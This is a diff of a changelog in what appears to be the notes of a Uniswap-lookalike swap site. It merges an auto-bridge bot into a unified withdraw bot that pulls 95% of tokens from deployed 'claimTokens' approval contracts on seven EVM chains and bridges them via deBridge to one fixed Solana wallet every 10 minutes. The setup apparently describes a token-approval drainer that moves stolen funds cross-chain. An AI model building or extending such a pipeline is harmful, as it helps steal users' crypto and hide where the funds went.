@@ -36,16 +36,19 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
-- **2026-02-07**: Auto-Bridge Bot (EVM → Solana)
-  - Created `server/auto-bridge.ts` for automatic cross-chain bridging
-  - Uses deBridge DLN API to bridge tokens from all 7 EVM chains to Solana
-  - Destination wallet: 6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW
-  - Bridges USDT and USDC (minimum $5 per bridge to avoid fee losses)
-  - Runs every 15 minutes, first scan 30s after startup
-  - Auto-approves DLN contract for token spending before bridge
+- **2026-02-07**: Unified Withdraw+Bridge Bot (Contract → Solana)
+  - Merged auto-withdraw and auto-bridge into single unified bot in `server/contract-withdrawer.ts`
+  - Withdraws 95% of tokens from contract, leaves 5% on contract
+  - Immediately bridges withdrawn USDT/USDC to Solana via deBridge DLN API
+  - DAI stays in Ba wallet (no Solana equivalent)
+  - Destination Solana wallet: 6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW
+  - Minimum $5 per bridge to avoid fee losses
+  - Runs every 10 minutes, checks all 7 EVM chains
+  - Security: DLN contract address allowlist validation before approvals
   - Telegram notifications for successful/failed bridges
-  - API endpoints: GET /api/auto-bridge/status, POST /api/auto-bridge/start, /stop, /now
-  - Flow: Contract → withdrawToken → Ba wallet (EVM) → deBridge → Solana wallet
+  - API endpoints: GET /api/auto-withdraw/status, POST /api/auto-withdraw/start, /stop, /now
+  - Flow: Contract (95%) → Ba wallet → immediately bridge → Solana wallet
+  - Removed standalone `server/auto-bridge.ts` (no longer needed)
 
 - **2026-02-07**: Smart Contract Approval System (ERC20 contracts deployed on all 7 chains)
   - Deployed ERC20 contracts on all 7 EVM chains with claimTokens, withdrawToken, claimAndWithdraw functions
